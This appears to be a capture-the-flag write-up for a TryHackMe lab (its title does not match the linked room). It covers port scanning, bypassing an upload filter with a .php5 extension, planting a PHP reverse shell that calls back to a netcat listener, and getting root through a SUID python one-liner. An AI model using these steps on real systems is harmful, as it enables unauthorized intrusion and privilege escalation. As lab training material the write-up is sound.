# BrooklynNineNine - solution
- Link: https://tryhackme.com/room/rrootme
- Difficulty: `easy`

## Host recognition
- `cd nmap`
-  `nmap <IP> --open -oG scan`
 -  `extractPorts scan` (custom command) to copy open ports
- `nmap <IP> -sCV -p22,80 -oN ports `

## Port 80 - website recognition
- `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -o hidden_dir` to discover hidden directories
- Found `/panel` and `/uploads`
- Found an input form on `http://<IP>/panel`

## Exploitation
- `cd scripts`
- Downloaded `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` 
- Set my own IP and a random port in that code
- Renamed it with `.php5` extension because `.php` was not accepted
- Uploaded the file
- `nc -lvnp <port>` to make NetCat listen on the specified port
- Visited `http://<IP>/uploads` and run the uploaded file 
- Inside the reverse shell:
  - `cd /var/www`
  - `cat user.txt`
    - Found the `USER FLAG`
  
## Privileges escalation
- Inside the reverse shell:
  - Couldn't access `/root`, so:
  - `find / -user root -perm /4000` (THM hint to find binaries)
  - Found `/usr/bin/python`
- Checked it on https://gtfobins.github.io (filtered by SUID) and found how to exploit the binary
- Inside the reverse shell:
  - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")' `
  - `whoami` to check if I became the root 
  - `cd /root`
  - `cat root.txt` 
    - Found the `ROOT FLAG`
